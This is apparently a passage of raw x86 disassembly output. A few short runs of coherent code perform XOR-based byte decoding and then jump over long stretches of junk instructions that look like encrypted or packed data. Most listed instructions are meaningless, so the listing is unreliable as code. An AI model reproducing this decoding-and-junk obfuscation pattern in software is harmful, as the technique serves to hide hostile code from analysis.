  404733:	mov    edx,DWORD PTR [ebp-0x2c]
  404736:	shl    ecx,0x1e
  404739:	mov    ecx,DWORD PTR [ebp-0x14]
  40473c:	xor    eax,edi
  40473e:	xor    edx,edx
  404740:	or     eax,edx
  404742:	mov    cl,BYTE PTR [eax+ecx*1]
  404745:	mov    eax,DWORD PTR [ebp-0x34]
  404748:	xor    BYTE PTR [eax],cl
  40474a:	mov    eax,DWORD PTR [ebp-0x20]
  40474d:	mov    ecx,DWORD PTR [ebp-0x1c]
  404750:	shrd   eax,ecx,0x2
  404754:	shr    ecx,0x2
  404757:	mov    ecx,DWORD PTR [ebp-0x20]
  40475a:	mov    edx,DWORD PTR [ebp-0x1c]
  40475d:	xor    eax,edi
  40475f:	jmp    0x404b00
  404764:	xchg   esp,eax
  404765:	mov    esi,DWORD PTR [esi-0x434b497e]
  40476b:	fwait
  40476c:	or     al,dl
  40476e:	cli    
  40476f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404770:	loope  0x40474d
  404772:	mov    al,ds:0xbe03be90
  404777:	mov    esi,0xbebec4bd
  40477c:	mov    BYTE PTR [eax],al
  40477e:	ds ret 0x6c3e
  404782:	sub    eax,0xd06a11
  404787:	push   ss
  404788:	(bad)  
  404789:	out    0xbe,al
  40478b:	add    eax,DWORD PTR [edx]
  40478d:	fdivr  st,st(3)
  40478f:	jb     0x4047f5
  404791:	in     al,dx
  404792:	cmp    esi,DWORD PTR [ebx-0x244f2c29]
  404798:	mul    DWORD PTR [ebx]
  40479a:	xor    esp,DWORD PTR [esi+0x6b]
  40479d:	or     dl,dh
  40479f:	repz into 
  4047a1:	jle    0x40472a
  4047a3:	inc    esi
  4047a4:	sbb    al,0xab
  4047a6:	push   edx
  4047a7:	das    
  4047a8:	push   ds
  4047a9:	idiv   DWORD PTR [esi-0x2e]
  4047ac:	add    al,0xc2
  4047ae:	sub    BYTE PTR [esp+edx*2],bl
  4047b1:	repz push edi
  4047b3:	jmp    0x9b6077b2
  4047b8:	aas    
  4047b9:	aaa    
  4047ba:	rol    BYTE PTR [esi],0x1d
  4047bd:	mov    eax,0x7f02d50d
  4047c2:	fnstcw WORD PTR [edi]
  4047c4:	(bad)  
  4047c5:	frstor [esi+0x1]
  4047c8:	cmp    DWORD PTR [eax+0x20e38d87],ebp
  4047ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047cf:	pop    es
  4047d0:	add    al,0xe9
  4047d2:	js     0x4047b7
  4047d4:	or     DWORD PTR [edx+0x12110461],ebp
  4047da:	fisttp WORD PTR [ebx-0x17]
  4047dd:	in     al,dx
  4047de:	adc    DWORD PTR [edi-0x6e],0x4ea4ab7d
  4047e5:	jg     0x404801
  4047e7:	(bad)  
  4047e8:	pop    eax
  4047e9:	and    ebp,DWORD PTR [ebx-0x443089b5]
  4047ef:	add    BYTE PTR [ecx+0x75bada6f],dh
  4047f5:	cld    
  4047f6:	dec    edx
  4047f7:	(bad)  
  4047f8:	ja     0x404837
  4047fa:	(bad)  
  4047fb:	shl    DWORD PTR [ebx],cl
  4047fd:	jmp    0xee08ff88
  404802:	pushf  
  404803:	mov    BYTE PTR [eax],dh
  404805:	pop    es
  404806:	push   esp
  404807:	aam    0x6b
  404809:	and    BYTE PTR [ecx+0x49d1db06],bh
  40480f:	pusha  
  404810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404811:	mov    dl,0xca
  404813:	out    0xfc,eax
  404815:	outs   dx,BYTE PTR ds:[esi]
  404816:	fcom   QWORD PTR ds:0x5c02a2a8
  40481c:	jmp    DWORD PTR [ebp+eiz*4-0x223b832e]
  404823:	aam    0xcf
  404825:	sar    bl,cl
  404827:	xchg   esp,eax
  404828:	adc    al,0x1a
  40482a:	jnp    0x40483a
  40482c:	adc    al,0x6d
  40482e:	into   
  40482f:	retf   
  404830:	mov    eax,0x8099a041
  404835:	mov    esi,DWORD PTR [edx+0x1d]
  404838:	out    0xc6,al
  40483a:	cld    
  40483b:	shl    cl,1
  40483d:	fbstp  TBYTE PTR [edx+0x5547ef46]
  404843:	in     al,dx
  404844:	jmp    0x4047e7
  404846:	cmp    eax,0x27a5ac53
  40484b:	sbb    esp,ecx
  40484d:	cwde   
  40484e:	and    ebx,DWORD PTR [edi-0x22]
  404851:	xchg   BYTE PTR [ecx],dl
  404853:	popf   
  404854:	add    al,0x14
  404856:	push   edi
  404857:	mov    dh,0x3e
  404859:	sub    dh,BYTE PTR [ecx-0x4b]
  40485c:	inc    edi
  40485d:	xchg   ebp,eax
  40485e:	sub    DWORD PTR [eax],0xffffff88
  404861:	dec    ebx
  404862:	scas   eax,DWORD PTR es:[edi]
  404863:	not    BYTE PTR [edx]
  404865:	dec    esi
  404866:	sbb    dl,al
  404868:	inc    ecx
  404869:	ja     0x4048cf
  40486b:	icebp  
  40486c:	push   esp
  40486d:	sahf   
  40486e:	lahf   
  40486f:	xor    al,0xc6
  404871:	hlt    
  404872:	iret   
  404873:	ficomp WORD PTR [eax]
  404875:	pop    ecx
  404876:	fild   QWORD PTR [edi+edi*4+0x66d63bad]
  40487d:	out    0x20,al
  40487f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404880:	fcmovnbe st,st(4)
  404882:	xchg   esp,eax
  404883:	cld    
  404884:	adc    edi,esp
  404886:	gs test eax,0x3cb02acb
  40488c:	popa   
  40488d:	and    BYTE PTR [esi],bh
  40488f:	call   DWORD PTR [eax+0x21]
  404892:	clc    
  404893:	mov    esp,0x74e88268
  404898:	pop    ebp
  404899:	push   esi
  40489a:	rcr    DWORD PTR [eax+0x4c],cl
  40489d:	jge    0x40485a
  40489f:	or     al,0xd
  4048a1:	push   ds
  4048a2:	aam    0x94
  4048a4:	fs inc ecx
  4048a6:	jl     0x4048c9
  4048a8:	xchg   esi,eax
  4048a9:	stos   BYTE PTR es:[edi],al
  4048aa:	je     0x40486b
  4048ac:	ins    BYTE PTR es:[edi],dx
  4048ad:	mov    DWORD PTR [ecx],edi
  4048af:	jp     0x404852
  4048b1:	fcompp 
  4048b3:	ins    DWORD PTR es:[edi],dx
  4048b4:	fld    TBYTE PTR [edi]
  4048b6:	mov    ebx,0x45bbdbda
  4048bb:	dec    eax
  4048bc:	rol    bl,1
  4048be:	add    al,0xc9
  4048c0:	loope  0x404911
  4048c2:	imul   esp,esi,0x6f753de9
  4048c8:	cwde   
  4048c9:	loopne 0x404912
  4048cb:	cmc    
  4048cc:	adc    al,0x1a
  4048ce:	add    DWORD PTR [edi-0x4d],edi
  4048d1:	and    ah,BYTE PTR [ebp+0x73bbeadd]
  4048d7:	mov    ds:0x5bd3fe82,al
  4048dc:	add    eax,0x2b4479fa
  4048e1:	sbb    al,0x91
  4048e3:	shl    DWORD PTR [edi+0x58fa4567],0xaf
  4048ea:	inc    ebx
  4048eb:	jo     0x4048ef
  4048ed:	or     eax,0x6641cc46
  4048f2:	mov    bl,0x32
  4048f4:	jle    0x404950
  4048f6:	mov    ebx,0x6707660b
  4048fb:	xchg   esp,eax
  4048fc:	lods   al,BYTE PTR ds:[esi]
  4048fd:	stos   DWORD PTR es:[edi],eax
  4048fe:	and    ch,BYTE PTR [ecx-0x5d]
  404901:	and    DWORD PTR [edx],0xb7777926
  404907:	dec    edx
  404908:	xchg   edi,eax
  404909:	inc    ebx
  40490a:	arpl   bp,bx
  40490c:	loop   0x4048e3
  40490e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40490f:	mov    cl,0x86
  404911:	jne    0x40496d
  404913:	xchg   DWORD PTR [ebx],ebx
  404915:	adc    ecx,DWORD PTR [ecx+0x1bdc5468]
  40491b:	mov    BYTE PTR [edx],0xa
  40491e:	or     ah,dl
  404920:	push   ss
  404921:	xchg   DWORD PTR [esi-0x60],ebx
  404924:	out    0x80,al
  404926:	gs jbe 0x4048d7
  404929:	std    
  40492a:	and    dl,BYTE PTR [edi+0x6]
  40492d:	es push edx
  40492f:	mov    ebp,esp
  404931:	and    DWORD PTR [esi],ebp
  404933:	xor    ah,BYTE PTR [ebp-0x20]
  404936:	jecxz  0x404999
  404938:	test   DWORD PTR [ecx-0x30],esi
  40493b:	ret    0xf570
  40493e:	mov    dl,0x63
  404940:	dec    ebp
  404941:	adc    BYTE PTR [esi-0x80],bh
  404944:	out    0x8f,al
  404946:	aam    0x4f
  404948:	xor    cl,bl
  40494a:	inc    ebx
  40494b:	inc    eax
  40494c:	add    dl,BYTE PTR [ecx+eax*1-0x14]
  404950:	arpl   WORD PTR [ecx+0x42df0f0e],sp
  404956:	xlat   BYTE PTR ds:[ebx]
  404957:	in     al,dx
  404958:	sbb    DWORD PTR [ebp+0x40],ebx
  40495b:	mov    edi,0xac4fdda9
  404960:	jbe    0x4049df
  404962:	jnp    0x4049cc
  404964:	aam    0xbf
  404966:	adc    ebx,DWORD PTR [eax]
  404968:	dec    esi
  404969:	ss cmp al,0xcd
  40496c:	dec    ebp
  40496d:	enter  0x1bb2,0x54
  404971:	xor    DWORD PTR [eax],ecx
  404973:	sbb    ecx,DWORD PTR [edx+0x285d4089]
  404979:	xchg   BYTE PTR [esi-0x77],ch
  40497c:	pop    ecx
  40497d:	popa   
  40497e:	sub    al,0x7f
  404980:	sbb    dh,BYTE PTR [ebx-0x7e4f06fd]
  404986:	(bad)  [di-0x4]
  40498a:	test   eax,0xacfa76a5
  40498f:	and    DWORD PTR [ebp-0x780cc3e9],esp
  404995:	test   eax,0xa9cab564
  40499a:	add    BYTE PTR [ebx],bl
  40499c:	sub    DWORD PTR [edi],edx
  40499e:	in     eax,dx
  40499f:	adc    bl,dl
  4049a1:	aaa    
  4049a2:	sub    ecx,DWORD PTR [edi+eiz*8-0x31]
  4049a6:	scas   al,BYTE PTR es:[edi]
  4049a7:	push   edi
  4049a8:	and    DWORD PTR [ebx+0x1aa87f90],esp
  4049ae:	lahf   
  4049af:	sbb    eax,0x4f2d31d9
  4049b4:	jle    0x4049a0
  4049b6:	sub    dh,cl
  4049b8:	add    ebp,DWORD PTR [esi]
  4049ba:	mov    DWORD PTR [ecx],edi
  4049bc:	retf   
  4049bd:	pop    ds
  4049be:	mov    cl,0x7a
  4049c0:	aas    
  4049c1:	inc    edx
  4049c2:	loop   0x404a2e
  4049c4:	and    dh,dh
  4049c6:	jecxz  0x404a20
  4049c8:	xchg   edx,eax
  4049c9:	add    ebx,DWORD PTR [edi+0x27]
  4049cc:	pop    ss
  4049cd:	test   BYTE PTR [ecx],bl
  4049cf:	sbb    al,0xa1
  4049d1:	or     DWORD PTR [eax],eax
  4049d3:	xor    DWORD PTR [ebp+ebp*1-0x4f],edi
  4049d7:	xor    BYTE PTR [eax+0x5ef54630],ah
  4049dd:	cmp    dh,BYTE PTR ds:0x6841d576
  4049e3:	mov    ebp,0x1ba22d06
  4049e8:	dec    ebx
  4049e9:	cmp    al,0x52
  4049eb:	and    BYTE PTR [edx+0x12],dl
  4049ee:	out    0xbc,eax
  4049f0:	jl     0x404a6e
  4049f2:	dec    ebp
  4049f3:	in     eax,dx
  4049f4:	and    al,0xb8
  4049f6:	pop    ebp
  4049f7:	loopne 0x404a26
  4049f9:	out    0x85,al
  4049fb:	ins    DWORD PTR es:[edi],dx
  4049fc:	scas   al,BYTE PTR es:[edi]
  4049fd:	rol    bh,1
  4049ff:	mov    bl,0xd5
  404a01:	ficomp WORD PTR [ecx+eiz*2-0x48]
  404a05:	adc    al,0x9c
  404a07:	in     eax,dx
  404a08:	sub    edi,DWORD PTR [esi+0x15f2949e]
  404a0e:	mov    ecx,0x3e8f6c26
  404a13:	jno    0x404a0e
  404a15:	int    0xf1
  404a17:	and    ah,bh
  404a19:	cmp    ebx,DWORD PTR [eax+0xf]
  404a1c:	fs dec esp
  404a1e:	das    
  404a1f:	push   0xf8ef31de
  404a24:	mov    ah,0xa8
  404a26:	adc    ah,cl
  404a28:	mov    edi,0x3fb33746
  404a2d:	adc    DWORD PTR [esi],0x263fa3d
  404a33:	add    eax,0x240f00e5
  404a38:	pop    es
  404a39:	ins    DWORD PTR es:[edi],dx
  404a3a:	scas   al,BYTE PTR es:[edi]
  404a3b:	hlt    
  404a3c:	mov    dl,0x7
  404a3e:	push   esi
  404a3f:	sub    eax,0x1872e8a2
  404a44:	enter  0xec3c,0xff
  404a48:	(bad)  
  404a49:	pop    esi
  404a4a:	(bad)  
  404a4b:	outs   dx,BYTE PTR ds:[esi]
  404a4c:	fstp   st(4)
  404a4e:	cmp    eax,0x90b2b7dc
  404a53:	pop    eax
  404a54:	inc    ebp
  404a55:	icebp  
  404a56:	mov    BYTE PTR [ebp-0x7627bdbc],dh
  404a5c:	into   
  404a5d:	or     BYTE PTR [eax+0x5eb8cf9e],0x4d
  404a64:	sbb    al,0x9
  404a66:	in     eax,0x43
  404a68:	retf   
  404a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a6a:	mov    eax,ds:0x3ed9113d
  404a6f:	(bad)  
  404a70:	cld    
  404a71:	les    esi,FWORD PTR [esi+ecx*8]
  404a74:	ja     0x404a4c
  404a76:	xor    ah,dl
  404a78:	xor    al,0x9f
  404a7a:	mov    bh,0x2a
  404a7c:	cwde   
  404a7d:	push   cs
  404a7e:	inc    edx
  404a7f:	mov    ebp,gs
  404a81:	fwait
  404a82:	jecxz  0x404a8d
  404a84:	loope  0x404a4d
  404a86:	(bad)  
  404a87:	jbe    0x404a74
  404a89:	bound  ebx,QWORD PTR [esi-0x1a]
  404a8c:	inc    esi
  404a8d:	add    DWORD PTR [ebx-0x43],esp
  404a90:	rol    DWORD PTR [eax],cl
  404a92:	cmp    al,0xb
  404a94:	and    ebp,DWORD PTR [ebx+0x38]
  404a97:	pop    edi
  404a98:	mov    ds:0xb862b36c,eax
  404a9d:	pop    ds
  404a9e:	fist   WORD PTR [edi]
  404aa0:	arpl   WORD PTR [eax],cx
  404aa2:	pop    ds
  404aa3:	aaa    
  404aa4:	fcomp  QWORD PTR [ecx-0x45]
  404aa7:	jmp    0xd49:0xf0fb7f9d
  404aae:	add    al,0xd6
  404ab0:	in     al,0xd8
  404ab2:	push   esp
  404ab3:	mov    eax,fs:0x6fe0355c
  404ab9:	lods   eax,DWORD PTR ds:[esi]
  404aba:	push   es
  404abb:	adc    al,0x83
  404abd:	mov    ch,BYTE PTR [ebx+ebp*4-0x4]
  404ac1:	pushf  
  404ac2:	inc    ecx
  404ac3:	shl    BYTE PTR [ebp-0x2622c829],1
  404ac9:	xchg   ebx,eax
  404aca:	jbe    0x404b1b
  404acc:	sub    al,0x2b
  404ace:	pop    ss
  404acf:	sbb    dl,bl
  404ad1:	rol    ah,1
  404ad3:	data16 mov fs,WORD PTR [ebp+0x2036d9b5]
  404ada:	ds push esi
  404adc:	or     al,0x8d
  404ade:	and    eax,0xa40766fb
  404ae3:	in     eax,0x3e
  404ae5:	es (bad) 
  404ae8:	pop    es
  404ae9:	fidivr DWORD PTR fs:[eax-0x3cfb4e47]
  404af0:	out    0x92,eax
  404af2:	push   ds
  404af3:	cmp    eax,ebp
  404af5:	mov    esp,0x994f6e34
  404afa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404afb:	ret    
  404afc:	sub    DWORD PTR [esp+esi*8],0x1ee1c1b0
  404b03:	xor    edx,edx
  404b05:	or     eax,edx
  404b07:	lea    eax,[ebp+eax*1-0x4]
  404b0b:	mov    DWORD PTR [ebp-0x34],eax
  404b0e:	mov    eax,DWORD PTR [ebp-0x20]
  404b11:	mov    ecx,DWORD PTR [ebp-0x1c]
  404b14:	shrd   eax,ecx,0x2
  404b18:	shr    ecx,0x2
  404b1b:	mov    ecx,DWORD PTR [ebp-0x20]
  404b1e:	mov    edx,DWORD PTR [ebp-0x1c]
  404b21:	shl    ecx,0x1e
  404b24:	mov    ecx,DWORD PTR [ebp-0x14]
  404b27:	jmp    0x404ec8
  404b2c:	cmp    BYTE PTR [edx],ch
  404b2e:	push   0xffffff83
  404b30:	jl     0x404ab5
  404b32:	cmp    BYTE PTR [edx-0x61edfbc6],bh
  404b38:	sbb    ecx,DWORD PTR [ebp+0x9bd9e60]
  404b3e:	mov    esi,0xbec4bdbe
  404b43:	mov    esi,0x89433be0
  404b48:	pop    edx
  404b49:	mov    al,ds:0xcf9a7e1b
  404b4e:	aaa    
  404b4f:	shr    ebp,1
  404b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b52:	xor    edi,ebp
  404b54:	sub    BYTE PTR [ebx-0x146a6558],ch
  404b5a:	scas   eax,DWORD PTR es:[edi]
  404b5b:	add    ah,BYTE PTR [ecx-0x66]
  404b5e:	sbb    DWORD PTR ds:0x348da0da,ebp
  404b64:	mov    esi,DWORD PTR ds:0xcaf29523
  404b6a:	call   DWORD PTR [eax-0x59]
  404b6d:	or     BYTE PTR [eax+0x78],dl
  404b70:	aas    
  404b71:	and    al,0x8
  404b73:	rol    DWORD PTR [eax+0x5af3711e],1
  404b79:	inc    esp
  404b7a:	push   ss
  404b7b:	push   ebx
  404b7c:	daa    
  404b7d:	mov    edx,0x103b1a9a
  404b82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b83:	jo     0x404bdd
  404b85:	imul   DWORD PTR [edx+0x6b]
  404b88:	mov    al,ah
  404b8a:	repnz cmp al,0x3f
  404b8d:	pop    esp
  404b8e:	cmp    bh,BYTE PTR [eax]
  404b90:	sub    dl,dh
  404b92:	adc    eax,0x7b9a7b1f
  404b97:	mov    ds:0x6ad9b473,al
  404b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b9d:	cmp    edi,DWORD PTR [edi-0x43]
  404ba0:	push   ds
  404ba1:	jmp    0x404b2b
  404ba3:	sbb    cl,BYTE PTR [edx+0x3484879e]
  404ba9:	rol    BYTE PTR [ecx+0x2286044a],0x48
  404bb0:	fdiv   st(5),st
  404bb2:	lahf   
  404bb3:	inc    edi
  404bb4:	cmovs  eax,DWORD PTR [eax-0x7c]
  404bb8:	sahf   
  404bb9:	dec    ebp
  404bba:	mov    ecx,0x5dfbec74
  404bbf:	inc    edi
  404bc0:	cmp    al,0xaa
  404bc2:	pop    esi
  404bc3:	test   al,0x1e
  404bc5:	jae    0x404ba1
  404bc7:	mov    cl,BYTE PTR [eax]
  404bc9:	addr16 mov dl,0x64
  404bcc:	cmc    
  404bcd:	pop    ds
  404bce:	pop    esi
  404bcf:	enter  0x3e56,0x1b
  404bd3:	in     eax,0x95
  404bd5:	out    dx,eax
  404bd6:	stos   DWORD PTR es:[edi],eax
  404bd7:	mov    DWORD PTR [ebp+0x543646e9],esi
  404bdd:	imul   eax,DWORD PTR [eax-0x3da09d3],0xffffff93
  404be4:	lahf   
  404be5:	clc    
  404be6:	fsqrt  
  404be8:	pop    edx
  404be9:	and    eax,0x99a5a839
  404bee:	call   0xb8f6:0x6bc6b717
  404bf5:	lock les esi,FWORD PTR [ebp-0x14]
  404bf9:	repnz scas eax,DWORD PTR es:[edi]
  404bfb:	ja     0x404c12
  404bfd:	jge    0x404c00
  404bff:	popf   
  404c00:	stc    
  404c01:	test   ch,bh
  404c03:	loop   0x404bf7
  404c05:	outs   dx,DWORD PTR ds:[esi]
  404c06:	ins    DWORD PTR es:[edi],dx
  404c07:	imul   esi,DWORD PTR [eax-0x350ca8b7],0xffffffb7
  404c0e:	scas   al,BYTE PTR es:[edi]
  404c0f:	out    dx,eax
  404c10:	stc    
  404c11:	lock jecxz 0x404ba9
  404c14:	mov    bh,ah
  404c16:	mov    BYTE PTR [ebp+edx*2-0x17c62eea],al
  404c1d:	cli    
  404c1e:	ret    0x8cdc
  404c21:	je     0x404bf0
  404c23:	pop    esp
  404c24:	adc    ecx,DWORD PTR [eax+0x53]
  404c27:	jbe    0x404bb8
  404c29:	lahf   
  404c2a:	dec    ecx
  404c2b:	mov    eax,0xa93889ae
  404c30:	ins    BYTE PTR es:[edi],dx
  404c31:	xlat   BYTE PTR ds:[ebx]
  404c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c33:	sub    al,0x35
  404c35:	(bad)  
  404c37:	mov    al,0x1a
  404c39:	push   edi
  404c3a:	jmp    0x1c10:0xf2be092e
  404c41:	add    ebp,esi
  404c43:	dec    edx
  404c44:	ja     0x404c17
  404c46:	sbb    edx,esp
  404c48:	pop    ss
  404c49:	int3   
  404c4a:	dec    esp
  404c4b:	xlat   BYTE PTR ds:[ebx]
  404c4c:	sub    BYTE PTR [ebx],dl
  404c4e:	fcmovbe st,st(0)
  404c50:	dec    edi
  404c52:	data16 mov bl,0xa8
  404c55:	das    
  404c56:	ror    BYTE PTR [ebp-0x77],cl
  404c59:	inc    ecx
  404c5a:	add    ebp,DWORD PTR [ebp-0x1e]
  404c5d:	sub    BYTE PTR [eax],dh
  404c5f:	adc    DWORD PTR [ecx+0x35],ebx
  404c62:	xor    DWORD PTR [edx],eax
  404c64:	jp     0x404bec
  404c66:	test   eax,0xc937602e
  404c6b:	ins    BYTE PTR es:[edi],dx
  404c6c:	mov    eax,ds:0x5e0c6b4d
  404c71:	adc    al,BYTE PTR [eax+0x73d9a91]
  404c77:	dec    edx
  404c78:	lahf   
  404c79:	in     eax,dx
  404c7a:	outs   dx,DWORD PTR ds:[esi]
  404c7b:	or     ebx,DWORD PTR [ecx]
  404c7d:	jecxz  0x404c33
  404c7f:	add    BYTE PTR [esi*2-0x45a5cf09],0x21
  404c87:	adc    bl,cl
  404c89:	push   esi
  404c8a:	xchg   BYTE PTR [ebx-0x5c],ch
  404c8d:	xor    eax,0xf6da229b
  404c92:	jge    0x404c47
  404c94:	ins    BYTE PTR es:[edi],dx
  404c95:	dec    edx
  404c96:	sub    eax,0xa337ddd0
  404c9b:	stos   DWORD PTR es:[edi],eax
  404c9c:	clc    
  404c9d:	in     al,dx
  404c9e:	jp     0x404ce0
  404ca0:	lock es push cs
  404ca3:	pop    ds
  404ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ca5:	xor    eax,0x1a47a037
  404caa:	ret    0xcf3e
  404cad:	lods   al,BYTE PTR ds:[esi]
  404cae:	xchg   esi,eax
  404caf:	lahf   
  404cb0:	push   esp
  404cb1:	pop    ecx
  404cb2:	and    al,0xf
  404cb4:	ins    BYTE PTR es:[edi],dx
  404cb5:	dec    esi
  404cb6:	mov    ebx,0x224399ed
  404cbb:	lock sub eax,0xfe60dff8
  404cc1:	pop    ss
  404cc2:	inc    edi
  404cc3:	add    esp,DWORD PTR [eax-0x1f]
  404cc6:	test   BYTE PTR [eax],ch
  404cc8:	(bad)  
  404cc9:	jne    0x404d0a
  404ccb:	repz cmp dl,BYTE PTR [edi]
  404cce:	nop
  404ccf:	jl     0x404cd6
  404cd1:	ins    DWORD PTR es:[edi],dx
  404cd2:	add    eax,0x8016a188
  404cd7:	pop    ss
  404cd8:	lds    ebp,FWORD PTR [edx]
  404cda:	fnstcw WORD PTR [ecx+ebx*4+0x134f7cff]
  404ce1:	cmp    al,ah
  404ce3:	in     eax,0x69
  404ce5:	loopne 0x404c82
  404ce7:	lods   al,BYTE PTR ds:[esi]
  404ce8:	ror    ch,1
  404cea:	push   ebp
  404ceb:	add    eax,edi
  404ced:	scas   eax,DWORD PTR es:[edi]
  404cee:	xor    BYTE PTR [ecx],dh
  404cf0:	ret    0x823a
  404cf3:	sub    al,0x39
  404cf5:	(bad)  
  404cf7:	jae    0x404d5a
  404cf9:	dec    esp
  404cfa:	jnp    0x404cd8
  404cfc:	stc    
  404cfd:	cdq    
  404cfe:	mov    ss,esp
  404d00:	fcomip st,st(1)
  404d02:	popa   
  404d03:	xchg   ebp,eax
  404d04:	fcmovbe st,st(2)
  404d06:	lods   al,BYTE PTR ds:[esi]
  404d07:	fdiv   st(3),st
  404d09:	imul   ecx
  404d0b:	jp     0x404d05
  404d0d:	jne    0x404d34
  404d0f:	mov    cl,al
  404d11:	enter  0x95b6,0x73
  404d15:	jns    0x404d1c
  404d17:	add    al,BYTE PTR [edi-0x80]
  404d1a:	xchg   ecx,eax
  404d1b:	ja     0x404ceb
  404d1d:	mov    ch,0x47
  404d1f:	jmp    0xae4a:0xcc09067d
  404d26:	pop    ebx
  404d27:	rcr    DWORD PTR [eax+0x9175ef],cl
  404d2d:	loope  0x404d30
  404d2f:	or     al,0x31
  404d31:	push   ebp
  404d32:	mov    bh,0xaa
  404d34:	loope  0x404d11
  404d36:	cmp    dl,0x49
  404d39:	(bad)  
  404d3a:	jecxz  0x404d22
  404d3c:	sbb    edi,DWORD PTR [ebp+0x54]
  404d3f:	push   ss
  404d40:	das    
  404d41:	hlt    
  404d42:	jbe    0x404d45
  404d44:	stos   DWORD PTR es:[edi],eax
  404d45:	jo     0x404d30
  404d47:	sub    DWORD PTR [ebx+ebx*8],ebx
  404d4a:	mov    cl,0x7d
  404d4c:	mov    ah,0xa0
  404d4e:	mov    ebx,DWORD PTR [ecx+0x7686aaed]
  404d54:	jns    0x404d03
  404d56:	and    BYTE PTR [edx+0x12],dh
  404d59:	das    
  404d5a:	fs cwde 
  404d5c:	and    BYTE PTR [eax],ch
  404d5e:	xchg   BYTE PTR [edx],ah
  404d60:	je     0x404d42
  404d62:	aaa    
  404d63:	mov    BYTE PTR [eax-0x74958bfe],bh
  404d69:	inc    esi
  404d6a:	mov    ds:0xcb114d0e,al
  404d6f:	lea    esp,[ecx-0x62]
  404d72:	inc    eax
  404d73:	mov    bh,0x8e
  404d75:	adc    DWORD PTR [edx],0xffffff8e
  404d78:	lds    esp,FWORD PTR [ebx-0x48]
  404d7b:	push   ecx
  404d7c:	sti    
  404d7d:	or     DWORD PTR [ebx],ebp
  404d7f:	dec    esi
  404d80:	push   cs
  404d81:	cmc    
  404d82:	aas    
  404d83:	mov    al,0x6b
  404d85:	gs ret 
  404d87:	sbb    bh,BYTE PTR [esi+0x2ba1ddbf]
  404d8d:	rcl    BYTE PTR [eax],0xdf
  404d90:	sbb    DWORD PTR [edi+0x40],esi
  404d93:	mov    edi,0xe18a7940
  404d98:	mov    dl,0xbe
  404d9a:	test   edx,0x632aedbd
  404da0:	inc    edi
  404da1:	mov    BYTE PTR [ebx],dl
  404da3:	dec    esi
  404da4:	push   edx
  404da5:	xchg   ebx,eax
  404da6:	loope  0x404d65
  404da8:	dec    esp
  404da9:	dec    edi
  404daa:	pop    ebx
  404dab:	stos   DWORD PTR es:[edi],eax
  404dac:	clc    
  404dad:	mov    edx,0xba168bef
  404db2:	icebp  
  404db3:	sub    eax,0x1d34c697
  404db8:	loope  0x404dc7
  404dba:	mov    esp,0x1354cfac
  404dbf:	dec    esp
  404dc0:	aam    0xa
  404dc2:	inc    ebx
  404dc3:	cwde   
  404dc4:	in     al,dx
  404dc5:	jno    0x404e3c
  404dc7:	sub    bl,BYTE PTR [ecx+0x4b]
  404dca:	mov    edi,DWORD PTR [edx]
  404dcc:	mov    eax,ds:0x741982b4
  404dd1:	inc    ebx
  404dd2:	or     al,0x9c
  404dd4:	dec    ecx
  404dd5:	dec    edi
  404dd6:	scas   eax,DWORD PTR es:[edi]
  404dd7:	aam    0x67
  404dd9:	mov    dl,0xf2
  404ddb:	or     eax,0xa8fb0655
  404de0:	mov    ch,0x86
  404de2:	nop
  404de3:	stos   BYTE PTR es:[edi],al
  404de4:	in     al,0xe2
  404de6:	mov    ch,0x9c
  404de8:	daa    
  404de9:	mov    al,ds:0x206ef430
  404dee:	xor    BYTE PTR [edx-0xae82d0f],al
  404df4:	mov    eax,0x92482548
  404df9:	jb     0x404e16
  404dfb:	loope  0x404d8e
  404dfd:	out    0x21,al
  404dff:	add    dh,dh
  404e01:	arpl   WORD PTR [ecx-0x19],di
  404e04:	adc    ch,BYTE PTR [esi-0x6c]
  404e07:	es cli 
  404e09:	call   DWORD PTR [edx]
  404e0b:	cs jne 0x404e25
  404e0e:	inc    edx
  404e0f:	rcl    DWORD PTR [eax+0x5ae06ae],1
  404e15:	dec    esp
  404e16:	(bad)  
  404e17:	dec    ebp
  404e18:	lahf   
  404e19:	dec    esp
  404e1a:	ss js  0x404e14
  404e1d:	or     ebx,DWORD PTR [edi]
  404e1f:	call   0xb5fa:0x21a454c3
  404e26:	mov    ch,0x35
  404e28:	icebp  
  404e29:	push   cs
  404e2a:	fild   WORD PTR [ecx+ebx*4]
  404e2d:	push   esi
  404e2e:	mov    esp,0x1e22c209
  404e33:	adc    al,0xd0
  404e35:	in     eax,0x59
  404e37:	lahf   
  404e38:	imul   edx,DWORD PTR [esi+0x1f],0x56
  404e3c:	push   es
  404e3d:	jne    0x404e6a
  404e3f:	fld    st(4)
  404e41:	int3   
  404e42:	(bad)  
  404e43:	fmul   st(6),st
  404e45:	jb     0x404e23
  404e47:	sub    eax,0xee855e92
  404e4c:	in     eax,dx
  404e4d:	dec    edi
  404e4e:	sbb    eax,0x1fde8202
  404e53:	or     BYTE PTR [ebx-0x74155a22],0xd2
  404e5a:	loope  0x404e9a
  404e5c:	adc    al,0x75
  404e5e:	xchg   edi,eax
  404e5f:	jl     0x404e48
  404e61:	xchg   ebx,eax
  404e62:	mov    ebp,0x75525331
  404e67:	push   es
  404e68:	lods   eax,DWORD PTR ds:[esi]
  404e69:	dec    eax
  404e6b:	sbb    eax,0x6b0c00ff
  404e70:	dec    edx
  404e71:	sbb    DWORD PTR [ebp-0x54],esi
  404e74:	aad    0xfd
  404e76:	enter  0x4685,0x80
  404e7a:	ss dec ebx
  404e7c:	aas    
  404e7d:	iret   
  404e7e:	cdq    
  404e7f:	or     DWORD PTR [edx],eax
  404e81:	(bad)  
  404e82:	pusha  
  404e83:	cmc    
  404e84:	and    DWORD PTR [ebx-0x6e],eax
  404e87:	mov    bl,0xbd
  404e89:	sub    DWORD PTR [ebx+0x36],ecx
